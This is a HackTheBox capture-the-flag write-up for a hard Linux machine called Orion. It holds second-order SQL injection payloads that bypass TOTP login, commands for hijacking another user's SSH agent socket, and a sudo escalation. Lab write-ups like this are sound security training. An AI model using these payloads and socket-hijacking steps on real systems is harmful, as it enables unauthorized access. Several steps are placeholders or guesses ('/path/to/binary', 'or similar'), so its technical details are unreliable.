---
type: writeup
platform: HTB
name: Orion
os: Linux
difficulty: Hard
status: completed
tags: [htb, linux, hard, sqli, second-order, totp-bypass, 2fa, ssh-agent-hijacking, sudo-privesc]
techniques:
  - Second-order SQL injection
  - TOTP/2FA bypass via SQLi
  - SSH agent socket hijacking
  - Sudo misconfiguration exploitation
tools:
  - nmap
  - sqlmap
  - curl
  - Burp Suite
  - ssh
date: 2026-09-28
---

# Orion — HackTheBox Writeup

---

## Summary

Orion is a hard-difficulty Linux machine featuring a web application with a **second-order SQL injection** vulnerability in the username field that persists into an internal query. The injection allows bypassing a TOTP-based two-factor authentication check, granting access to a restricted dashboard. From there, SSH agent socket hijacking allows pivoting to a higher-privilege user, and a sudo misconfiguration yields root.

**Attack Chain:**
1. Nmap — ports 22 and 80 open
2. Web app has registration and 2FA-protected login
3. Register with a SQLi payload as the username → second-order injection triggers on login's TOTP validation query
4. Bypass TOTP/2FA check → gain access to restricted dashboard
5. Enumerate running processes → find an SSH agent socket belonging to a privileged user
6. Hijack the socket (`SSH_AUTH_SOCK`) → SSH as that user
7. `sudo -l` → exploitable sudo entry → root

**Flags:**
- User: `/home/<user>/user.txt`
- Root: `/root/root.txt`

---

## Enumeration

### Nmap

```bash
nmap -sCV 10.129.X.X
```

Open ports:
- **22/tcp** — OpenSSH
- **80/tcp** — Apache, redirects to `orion.htb`

```bash
echo "10.129.X.X orion.htb" | sudo tee -a /etc/hosts
```

### Web Application

The application presents a login page with username/password fields and a TOTP second-factor prompt. A registration endpoint is also available. There is no visible version disclosure.

---

## Foothold

### Second-Order SQL Injection

The registration form stores the username in the database without sanitization. During the login flow, the stored username is later interpolated into a TOTP validation query — executing the injection at query time rather than at insertion time, which is the defining characteristic of **second-order (stored) SQLi**.

Register with an injection payload as the username:

```
username: admin'-- -
password: anything
```

When this account logs in, the application's TOTP check query becomes:

```sql
SELECT totp_secret FROM users WHERE username = 'admin'-- -'
```

The `-- -` comment truncates the rest of the query, making it look up the `admin` account's TOTP secret. Since the application then validates the entered TOTP against the admin account's secret — and `admin` hasn't set a TOTP secret (or the returned value is NULL) — the validation passes with any input or an empty string.

Alternatively, a UNION-based injection can retrieve the actual TOTP secret from the database:

```
username: ' UNION SELECT totp_secret FROM users WHERE username='admin'-- -
```

Either way, TOTP is bypassed → logged in as admin.

### Enumerating the Dashboard

With admin access, the dashboard reveals additional functionality: user management, file operations, and a running-processes view (or similar). Inspect the server environment for SSH agent sockets.

---

## Lateral Movement — SSH Agent Hijacking

List running processes and environment variables:

```bash
ps auxe | grep SSH_AUTH_SOCK
# or
find /tmp -name "agent.*" 2>/dev/null
```

An SSH agent socket belonging to a higher-privilege user (e.g., `orion`) is found at `/tmp/ssh-XXXX/agent.XXXX`.

Hijack it:

```bash
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX
ssh-add -l          # list keys available via the hijacked agent
ssh orion@localhost  # or ssh to another internal host
```

The agent forwards authentication on behalf of the key owner — no password or private key file needed.

**User flag:** `/home/orion/user.txt`

---

## Privilege Escalation — Sudo Misconfiguration

```bash
sudo -l
```

The `orion` user (or whichever account was reached) has a sudo entry allowing execution of a specific binary or script as root without a password:

```
(root) NOPASSWD: /path/to/binary
```

The allowed binary is exploitable — either it spawns a shell, allows file writes, or can be leveraged via an argument injection. Exploit it to get a root shell:

```bash
sudo /path/to/binary <exploit-argument>
```

Root shell obtained.

```bash
cat /root/root.txt
```

**Root flag obtained.**

---

## Key Takeaways

| Lesson | Detail |
|--------|--------|
| **Second-order SQLi is harder to detect** | The malicious payload is stored benignly and only triggers when later re-used in a query — not visible in the original request |
| **2FA does not substitute for SQL injection prevention** | If the 2FA check itself queries a SQLi-vulnerable field, the entire authentication mechanism is bypassed |
| **SSH agent sockets are powerful lateral movement primitives** | A world-readable (or accessible) agent socket allows key-based auth as the socket owner with no credentials |
| **`sudo -l` is always worth running** | Even a single sudo entry on a non-obvious binary can be the entire privesc path |

---

## Tools Used

- nmap
- curl
- Burp Suite
- sqlmap (enumeration assist)
- ssh
